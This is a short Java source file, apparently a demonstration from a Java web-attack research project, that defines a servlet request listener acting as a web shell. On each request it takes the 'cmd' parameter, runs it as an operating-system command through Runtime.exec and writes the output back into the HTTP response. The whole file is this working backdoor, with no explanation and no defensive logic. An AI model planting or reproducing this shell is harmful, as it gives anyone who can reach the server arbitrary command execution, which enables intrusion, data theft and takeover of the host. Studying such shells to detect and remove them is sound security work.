package cc.saferoad.servlet.listenermemshell;/*
@auther S0cke3t
@date 2021-12-29
*/

import javax.servlet.ServletRequest;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.ServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;

public class ListenerShellDemo implements ServletRequestListener {
    public ListenerShellDemo() {
    }

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
        ServletResponse servletResponse = null;
        ServletRequest servletRequest = servletRequestEvent.getServletRequest();
        try {
            Field servletResponseField = servletRequest.getClass().getDeclaredField("response");
            servletResponseField.setAccessible(true);
            servletResponse = (ServletResponse) servletResponseField.get(servletRequest);
            servletResponse.getWriter().println("get response ok");
        } catch (Exception e) {
            e.printStackTrace();
        }
        String command = servletRequest.getParameter("cmd");
        InputStream in;
        try {
            if (command != null && !command.isEmpty()) {
                PrintWriter out = servletResponse.getWriter();
                Process process = Runtime.getRuntime().exec(command);
                in = process.getInputStream();
                int a;
                byte[] b = new byte[1024];
                while ((a = in.read(b)) != -1) {
                    out.println(new String(b, 0, a));
                }
                in.close();
                out.flush();
                out.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {

    }
}
